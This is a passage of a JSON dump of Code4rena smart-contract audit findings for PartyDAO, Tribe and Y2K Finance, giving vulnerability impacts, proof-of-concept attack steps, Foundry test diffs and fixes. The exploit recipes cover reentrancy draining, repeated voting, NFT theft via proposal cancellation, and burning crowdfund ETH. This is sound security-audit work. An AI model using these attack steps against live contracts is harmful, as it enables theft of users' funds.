"https://github.com/code-423n4/2022-09-party-findings/issues/196", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfund.sol#L98-L116   # Vulnerability details  ## Impact  Party is DOS'd and may potentially lose access to NFT  ## Proof of Concept  [Crowdfund.sol#L280-L298](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L280-L298)      party = party_ = partyFactory         .createParty(             address(this),             Party.PartyOptions({                 name: name,                 symbol: symbol,                 governance: PartyGovernance.GovernanceOpts({                     hosts: governanceOpts.hosts,                     voteDuration: governanceOpts.voteDuration,                     executionDelay: governanceOpts.executionDelay,                     passThresholdBps: governanceOpts.passThresholdBps,                     totalVotingPower: _getFinalPrice().safeCastUint256ToUint96(),                     feeBps: governanceOpts.feeBps,                     feeRecipient: governanceOpts.feeRecipient                 })             }),             preciousTokens,             preciousTokenIds         );  [BuyCrowdfundBase.sol#L166-L173](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L166-L173)      function _getFinalPrice()         internal         override         view         returns (uint256)     {         return settledPrice;     }  When BuyCrowdFund.sol successfully completes a buy, totalVotingPower is set to _getFinalPrice which in the case of BuyCrowdFundBase.sol returns the price at which the NFT was purchased. totalVotingPower is used by the governance contract to determine the number of votes needed for a proposal to pass. If there are not enough claimable votes to meet that threshold then the party is softlocked because it can't pass any proposals. An attacker could exploit this to DOS even a private party with the following steps:  1. Wait for party to be filled to just under quorum threshold 2. Donate ETH to the crowdfund contract 3. Call BuyCrowdFund.sol#buy. Since it is unpermissioned even for parties with a gatekeeper, the call won't revert  Since the voting power for the final amount of ETH cannot be claimed, the party is now softlocked. If emergencyExecuteDisabled is true then the party will be permanantly locked and the NFT would effectively be burned. If emergencyExecuteDisabled is false then users would have to wait for PartyDAO to reclaim the NFT.  ## Tools Used  ## Recommended Mitigation Steps  Permission to call BuyCrowdFund.sol#buy should be gated if there is a gatekeeper"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/188", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Jeiwan-Q.md)."}, {"title": "Excess eth is not refunded", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/186", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L72   # Vulnerability details  ## Impact The ArbitraryCallsProposal contract requires sender to provide eth(msg.value) for each call. Now if user has provided more eth than combined call.value then this excess eth is not refunded back to user  ## Proof of Concept  1. Observe the [_executeArbitraryCalls function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L37)  ``` function _executeArbitraryCalls(         IProposalExecutionEngine.ExecuteProposalParams memory params     )         internal         returns (bytes memory nextProgressData)     {  ... uint256 ethAvailable = msg.value;         for (uint256 i = 0; i < calls.length; ++i) {             // Execute an arbitrary call.             _executeSingleArbitraryCall(                 i,                 calls[i],                 params.preciousTokens,                 params.preciousTokenIds,                 isUnanimous,                 ethAvailable             );             // Update the amount of ETH available for the subsequent calls.             ethAvailable -= calls[i].value;             emit ArbitraryCallExecuted(params.proposalId, i, calls.length);         } .... } ```  2. As we can see user provided msg.value is deducted with each calls[i].value 3. Assume user provided 5 amount as msg.value and made a single call with calls[0].value as 4 4. This means after calls have been completed ethAvailable will become 5-4=1 5. Ideally this 1 eth should be refunded back to user but there is no provision for same and the fund will remain in contract   ## Recommended Mitigation Steps At the end of _executeArbitraryCalls function, refund the remaining ethAvailable back to the user"}, {"title": "Maximum bid will always be used in Auction", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149   # Vulnerability details  ## Impact AuctionCrowdfund contract is designed in a way to allow bidding max upto maximumBid. But due to a flaw, anyone (including NFT seller) can make sure that CrowdFund bid always remain equal to maximumBid thus removing the purpose of maximumBid. This also causes loss to Party participating in this Auction as the auction will always end up with maximumBid even when it could have stopped with lower bid as shown in POC  ## Proof of Concept 1. An auction is started for NFT N in the market 2. Party Users P1 starts an AuctionCrowdfund with maximumBid as 100 for this auction.  ``` function initialize(AuctionCrowdfundOptions memory opts)         external         payable         onlyConstructor     { ... maximumBid = opts.maximumBid; ... } ```  3. P1 bids amount 10 for the NFT N using [bid function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149) 4. Some bad news arrives for the NFT collection including NFT N reducing its price 5. P1 decides not to bid more than amount 10 due to this news 6. NFT collection owner who is watching this AuctionCrowdfund observes that bidding is only 10 but Party users have maximumBid of 100 7. NFT collection owner  asks his friend to bid on this NFT in the auction market (different from crowd fund) 8. NFT collection owner now takes advantage of same and himself calls the bid function of AuctionCrowdfund via Proxy  ``` function bid() external onlyDelegateCall { ... } ```  9. Now since last bid belongs to collection owner friend, so AuctionCrowdfund contract simply extends its bid further   ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         }         // Get the minimum necessary bid to be the highest bidder.         uint96 bidAmount = market.getMinimumBid(auctionId_).safeCastUint256ToUint96();         // Make sure the bid is less than the maximum bid.         if (bidAmount > maximumBid) {             revert ExceedsMaximumBidError(bidAmount, maximumBid);         }         lastBid = bidAmount; ```  10. NFT collection owner keeps repeating step 7-9 until AuctionCrowdfund reaches the final maximum bid of 100 11. After auction completes, collection owner gets 100 amount instead of 10 even though crowd fund users never bidded for amount 100  ## Recommended Mitigation Steps maximumbid concept can easily be bypassed as shown above and will not make sense. Either remove it completely    OR bid function should only be callable via crowdfund members then attacker would be afraid if new bid will come or not and there should be a consensus between crowdfund members before bidding which will protect this scenario"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/160", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/fatherOfBlocks-Q.md)."}, {"title": "ArbitraryCallsProposal.sol and ListOnOpenseaProposal.sol safeguards can be bypassed by cancelling in-progress proposal allowing the majority to steal NFT", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/153", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L183-L202   # Vulnerability details  Note: PartyDAO acknowledges that \"canceling an InProgress proposal (mid-step) can leave the governance party in a vulnerable or undesirable state because there is no cleanup logic run during a cancel\" in the \"Known Issues / Topics\" section of the contest readme. I still believe that this vulnerability needs to be mitigated as it can directly lead to loss of user funds.  ## Impact  Majority vote can abuse cancel functionality to steal an NFT owned by the party  ## Proof of Concept  ArbitraryCallsProposal.sol implements the following safeguards for arbitrary proposals that are not unanimous:  1. Prevents the ownership of any NFT changing during the call. It does this by checking the the ownership of all NFTs before and after the call.  2. Prevents calls that would change the approval status of any NFT. This is done by disallowing the \"approve\" and \"setApprovalForAll\" function selectors.  Additionally ListOnOpenseaProposal.sol implements the following safeguards:  1. NFTs are first listed for auction on Zora so that if they are listed for a very low price then the auction will keep them from being purchased at such a low price  2. At the end of the auction the approval is revoked when _cleanUpListing is called  These safeguards are ultimately ineffective though. The majority could use the following steps to steal the NFT:  1. Create ListOnOpenseaProposal with high sell price and short cancel delay  2. Vote to approve proposal with majority vote  3. Execute first step of proposal, listing NFT on Zora auction for high price  4. Wait for Zora auction to end since the auction price is so high that no one will buy it  5. Execute next step, listing the NFT on Opensea. During this step the contract grants approval of the NFT to the Opensea contract  6. Wait for cancelDelay to expire  7. Call PartyGovernance.sol#cancel. This will immediately terminate the Opensea bypassing _cleanUpListing and keeping the approval to the Opensea contract  8. Create ArbitraryCallsProposal.sol that lists the NFT on Opensea for virtually nothing. Since only approval selectors have been blacklisted and the NFT does not change ownership, the proposal does not need to be unanimous to execute.  9. Approve proposal and execute  10. Buy NFT  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  When a proposal is canceled, it should call a proposal specific function that makes sure everything is cleaned up. NFTs delisted, approvals revoked, etc."}, {"title": "AuctionCrowdfund: If the contract was bid on before the NFT was gifted to the contract, lastBid will not be totalContributions", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/147", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242   # Vulnerability details  ## Impact In the finalize function of the AuctionCrowdfund contract, when the contract gets NFT and lastBid_ == 0, it is considered that NFT is gifted to the contract and everyone who contributed wins. ```         if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions; ``` But if the contract was bid before the NFT was gifted to the contract, then since lastBid_ ! = 0, only the user who contributed at the beginning will win. ## Proof of Concept https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L149-L175 ## Tools Used None ## Recommended Mitigation Steps Whether or not NFT is free to get should be determined using whether the contract balance is greater than totalContributions"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/R2-Q.md)."}, {"title": "TokenDistributor: ERC777 tokensToSend hook can be exploited to drain contract", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/120", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L131 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L386   # Vulnerability details  ## Impact `TokenDistributor.createERC20Distribution` can be used to create token distributions for ERC777 tokens (which are backwards-compatible with ERC20). However, this introduces a reentrancy vulnerability which allows a party to get the tokens of another party. The problem is the `tokensToSend` hook which is executed BEFORE balance updates happens (see https://eips.ethereum.org/EIPS/eip-777). When this hook is executed, `token.balanceOf(address(this))` therefore still returns the old value, but `_storedBalances[balanceID]` was already decreased.  ## Proof Of Concept Party A and Party B have a balance of 1,000,000 tokens (of some arbitrary ERC777 token) in the distributor. Let's say for the sake of simplicity that both parties only have one user (user A in party A, user B in party B). User A (or rather his smart contract) performs the following attack: - He calls `claim`, which transfers 1,000,000 tokens to his contract address. In `_transfer`, `_storedBalances[balanceId]` is decreased by 1,000,000 and therefore now has a value of 1,000,000. - In the `tokensToSend` hook, he initiates another distribution for his party A by calling `PartyGovernance.distribute` which calls `TokenDistributor.createERC20Distribution` (we assume for the sake of simplicity that the party does not have more of these tokens, so the call transfers 0 tokens to the distributor). `TokenDistributor.createERC20Distribution` passes `token.balanceOf(address(this))` to `_createDistribution`. Note that this is still 2,000,000 because we are in the `tokensToSend` hook. - The supply of this distribution is calculated as `(args.currentTokenBalance - _storedBalances[balanceId]) = 2,000,000 - 1,000,000 = 1,000,000`. - When the `tokensToSend` hook is exited (and the first transfer has finished), he can retrieve the tokens of the second distribution (that was created in the hook) to steal the 1,000,000 tokens of party B.  ## Recommended Mitigation Steps Do not allow reentrancy in these functions."}, {"title": "PartyGovernance: Can vote multiple times by transferring NFT in same block as proposal", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/113", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L594   # Vulnerability details  ## Impact `PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created.  This can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously.   The consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.  ## Proof Of Concept This diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one: ```diff --- a/sol-tests/party/PartyGovernanceUnit.t.sol +++ b/sol-tests/party/PartyGovernanceUnit.t.sol @@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          TestablePartyGovernance gov =              _createGovernance(100e18, preciousTokens, preciousTokenIds);          address undelegatedVoter = _randomAddress(); +        address recipient = _randomAddress();          // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)          gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));   @@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          // Undelegated voter submits proposal.          vm.prank(undelegatedVoter);          assertEq(gov.propose(proposal, 0), proposalId); - -        // Try to execute proposal (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            \"\", -            \"\" -        ); - -        // Skip past execution delay. -        skip(defaultGovernanceOpts.executionDelay); -        // Try again (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            \"\", -            \"\" -        ); +        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesPrev.votes, 50e18); +        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer +        vm.prank(recipient); +        gov.accept(proposalId, 0); +        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesAfter.votes, 100e18);      } ```  ## Recommended Mitigation Steps You should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets."}, {"title": "Possibility to burn all ETH in Crowdfund under some circumstances", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/105", "labels": ["bug", "3 (High Risk)", "high quality report", "resolved", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L147   # Vulnerability details  ## Impact If `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems: 1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable.  2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).  Issue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).  ## Proof Of Concept This diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:  ```diff --- a/sol-tests/crowdfund/BuyCrowdfund.t.sol +++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol @@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {      string defaultSymbol = 'PBID';      uint40 defaultDuration = 60 * 60;      uint96 defaultMaxPrice = 10e18; -    address payable defaultSplitRecipient = payable(0); +    address payable defaultSplitRecipient = payable(address(this));      uint16 defaultSplitBps = 0.1e4; -    address defaultInitialDelegate; +    address defaultInitialDelegate = address(this);      IGateKeeper defaultGateKeeper;      bytes12 defaultGateKeeperId;      Crowdfund.FixedGovernanceOpts defaultGovernanceOpts; @@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {                      maximumPrice: defaultMaxPrice,                      splitRecipient: defaultSplitRecipient,                      splitBps: defaultSplitBps, -                    initialContributor: address(this), +                    initialContributor: address(0),                      initialDelegate: defaultInitialDelegate,                      gateKeeper: defaultGateKeeper,                      gateKeeperId: defaultGateKeeperId, @@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {      function testHappyPath() public {          uint256 tokenId = erc721Vault.mint();          // Create a BuyCrowdfund instance. -        BuyCrowdfund pb = _createCrowdfund(tokenId, 0); +        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);          // Contribute and delegate.          address payable contributor = _randomAddress();          address delegate = _randomAddress();          vm.deal(contributor, 1e18);          vm.prank(contributor);          pb.contribute{ value: contributor.balance }(delegate, \"\"); -        // Buy the token. -        vm.expectEmit(false, false, false, true); -        emit MockPartyFactoryCreateParty( -            address(pb), -            address(pb), -            _createExpectedPartyOptions(0.5e18), -            _toERC721Array(erc721Vault.token()), -            _toUint256Array(tokenId) -        ); -        Party party_ = pb.buy( -            payable(address(erc721Vault)), -            0.5e18, -            abi.encodeCall(erc721Vault.claim, (tokenId)), -            defaultGovernanceOpts -        ); -        assertEq(address(party), address(party_)); -        // Burn contributor's NFT, mock minting governance tokens and returning -        // unused contribution. -        vm.expectEmit(false, false, false, true); -        emit MockMint( -            address(pb), -            contributor, -            0.5e18, -            delegate -        ); -        pb.burn(contributor); -        assertEq(contributor.balance, 0.5e18); +        vm.warp(block.timestamp + defaultDuration + 1); +        // The auction was not won, we can now burn all ETH from contributor... +        assertEq(address(pb).balance, 1.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 1e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.75e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.5e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0); ```  ## Recommended Mitigation Steps Do not allow an initial contribution when `opts.initialContributor` is not set."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/101", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Lambda-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Lambda-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/80", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/bulej93-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/rvierdiiev-Q.md)."}, {"title": "In RariMerkleRedeemer, function signAndClaim() doesn't have hasNotSigned and has different behavior than sign() and signAndClaimAndRedeem() ", "html_url": "https://github.com/code-423n4/2022-09-tribe-findings/issues/107", "labels": ["bug", "duplicate", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-tribe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/shutdown/fuse/RariMerkleRedeemer.sol#L88-L98 https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/shutdown/fuse/RariMerkleRedeemer.sol#L108-L118 https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/shutdown/fuse/RariMerkleRedeemer.sol#L48-L50   # Vulnerability details  ## Impact All three functions `signAndClaim()`, `sign()` and `signAndClaimAndRedeem()` are signing but `signAndClaim()` has different modifier than the other two. function `signAndClaim()` doesn't have `hasNotSigned` modifier and it's callable even when the users already signed. this different access level and behavior can cause other security issues. for example here it's possible for user to run sign multiple times.  ## Proof of Concept This is `signAndClaim()`, `sign()` and `signAndClaimAndRedeem()` codes in `RariMerkleRedeemer`: ```     function sign(bytes calldata signature) external override hasNotSigned nonReentrant {         _sign(signature);     }      function signAndClaim(         bytes calldata signature,         address[] calldata cTokens,         uint256[] calldata amounts,         bytes32[][] calldata merkleProofs     ) external override nonReentrant {         // both sign and claim/multiclaim will revert on invalid signatures/proofs         _sign(signature);         _multiClaim(cTokens, amounts, merkleProofs);     }      function signAndClaimAndRedeem(         bytes calldata signature,         address[] calldata cTokens,         uint256[] calldata amountsToClaim,         uint256[] calldata amountsToRedeem,         bytes32[][] calldata merkleProofs     ) external override hasNotSigned nonReentrant {         _sign(signature);         _multiClaim(cTokens, amountsToClaim, merkleProofs);         _multiRedeem(cTokens, amountsToRedeem);     } ``` As you can see `signAndClaimAndRedeem()` and `sign()` has `hasNotSigned ` modifier but `signAndClaim` doesn't have that modifier.  ## Tools Used VIM  ## Recommended Mitigation Steps add same modifier for `signAndClaimAndRedeem()` too."}, {"title": "Missing `hasNotSigned` modifier in `signAndClaim`", "html_url": "https://github.com/code-423n4/2022-09-tribe-findings/issues/51", "labels": ["bug", "disagree with severity", "high quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-tribe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/shutdown/fuse/RariMerkleRedeemer.sol#L93   # Vulnerability details  ## Impact [This](https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/shutdown/fuse/MultiMerkleRedeemer.sol#L41) comment and existence of the [`testCannotSignTwice`](https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/test/integration/shutdown/fuse/rariMerkleRedeemer.t.sol#L453) test case makes it clear that intended behavior of the protocol is to prevent users from submitting a signature of `MESSAGE_HASH` twice.  However, any user can circumvent this and overwrite once provided signature with another valid one.  ## Proof of Concept Add the following test case to [this file](https://github.com/code-423n4/2022-09-tribe/blob/main/contracts/test/integration/shutdown/fuse/rariMerkleRedeemer.t.sol) and run integration tests:  ```     function testCanSignTwice() public {         vm.startPrank(addresses[0]);          IERC20(cToken0).approve(address(redeemer), 100_000_000e18);         (uint8 v0, bytes32 r0, bytes32 s0) = vm.sign(keys[0], redeemer.MESSAGE_HASH());          bytes memory signature0 = bytes.concat(r0, s0, bytes1(v0));          redeemer.sign(signature0);          address[] memory cTokens;         uint256[] memory amounts;         bytes32[][] memory merkleProofs;          // vm.expectRevert(\"User has already signed\");         redeemer.signAndClaim(signature0, cTokens, amounts, merkleProofs);          vm.stopPrank();     } ``` As we can see, `signAndClaim` doesn't revert despite non-zero `userSignatures[msg.sender]` because of the missing `hasNotSigned` modifier. Moreover, when arguments passed to `redeemer.signAndClaim` are a signature and empty lists, then this function effectively behaves just like `_sign`.   ## Tools Used Foundry  ## Recommended Mitigation Steps Add missing `hasNotSigned` modifier to the `redeemer.signAndClaim`  function."}, {"title": "missing  hasNotSigned modifier", "html_url": "https://github.com/code-423n4/2022-09-tribe-findings/issues/27", "labels": ["bug", "duplicate", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-tribe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-tribe/blob/769b0586b4975270b669d7d1581aa5672d6999d5/contracts/shutdown/fuse/RariMerkleRedeemer.sol#L88   # Vulnerability details  ## Impact signing more than once  ## Proof of Concept Other sign functions has hasSigned modifier  ## Tools Used  ## Recommended Mitigation Steps function signAndClaim(         bytes calldata signature,         address[] calldata cTokens,         uint256[] calldata amounts,         bytes32[][] calldata merkleProofs     ) external override **hasSigned** nonReentrant  "}, {"title": "Griefing attack on the Vaults is possible, withdrawing the winning side stakes", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/434", "labels": ["bug", "3 (High Risk)", "high quality report", "sponsor confirmed", "old-submission-method", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L110-L119 https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203-L218   # Vulnerability details  *Anyone* can withdraw to `receiver` once the `receiver` is `isApprovedForAll(owner, receiver)`. The funds will be sent to `receiver`, but it will happen whenever an arbitrary `msg.sender` wants. The only precondition is the presence of any approvals.  This can be easily used to sabotage the system as a whole. Say there are two depositors in the hedge Vault, Bob and David, both trust each other and approved each other. Mike the attacker observing the coming end of epoch where no depeg happened, calls the withdraw() for both Bob and David in the last block of the epoch. Mike gained nothing, while both Bob and David lost the payoff that was guaranteed for them at this point.  Setting the severity to be high as this can be routinely used to sabotage the y2k users, both risk and hedge, depriving them from the payouts whenever they happen to be on the winning side. Usual attackers here can be the users from the another side, risk users attacking hedge vault, and vice versa.  ## Proof of Concept  isApprovedForAll() in withdrawal functions checks the `receiver` to be approved, not the caller.  SemiFungibleVault's withdraw:  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L110-L119  ```solidity     function withdraw(         uint256 id,         uint256 assets,         address receiver,         address owner     ) external virtual returns (uint256 shares) {         require(             msg.sender == owner || isApprovedForAll(owner, receiver),             \"Only owner can withdraw, or owner has approved receiver for all\"         ); ```  Vault's withdraw:  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203-L218  ```solidity     function withdraw(         uint256 id,         uint256 assets,         address receiver,         address owner     )         external         override         epochHasEnded(id)         marketExists(id)         returns (uint256 shares)     {         if(             msg.sender != owner &&             isApprovedForAll(owner, receiver) == false)             revert OwnerDidNotAuthorize(msg.sender, owner); ```  This way anyone at any time can run withdraw from the Vaults whenever owner has some address approved.  ## Recommended Mitigation Steps  Consider changing the approval requirement to be for the caller, not receiver:  SemiFungibleVault's withdraw:  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L110-L119  ```solidity     function withdraw(         uint256 id,         uint256 assets,         address receiver,         address owner     ) external virtual returns (uint256 shares) {         require( -           msg.sender == owner || isApprovedForAll(owner, receiver), +           msg.sender == owner || isApprovedForAll(owner, msg.sender),             \"Only owner can withdraw, or owner has approved receiver for all\"         ); ```  Vault's withdraw:  https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203-L218  ```solidity     function withdraw(         uint256 id,         uint256 assets,         address receiver,         address owner     )         external         override         epochHasEnded(id)         marketExists(id)         returns (uint256 shares)     {         if(             msg.sender != owner && -           isApprovedForAll(owner, receiver) == false) +           isApprovedForAll(owner, msg.sender) == false)             revert OwnerDidNotAuthorize(msg.sender, owner); ```  "}, {"title": "It is possible that receiver and treasury can receive nothing when calling `withdraw` function due to division being performed before multiplication", "html_url": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/378", "labels": ["bug", "2 (Med Risk)", "high quality report", "resolved", "sponsor confirmed", "selected for report"], "target": "2022-09-y2k-finance-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L378-L426 https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L203-L234   # Vulnerability details  ## Impact In the following `beforeWithdraw` function, `entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(idClaimTVL[id], 1 ether)` can be executed in several places. Because it uses division before multiplication, it is possible that `entitledAmount` is calculated to be 0. As the `withdraw` function shows below, when `entitledAmount` is 0, the receiver and treasury both receive 0. As a result, calling `withdraw` with a positive `assets` input can still result in transferring 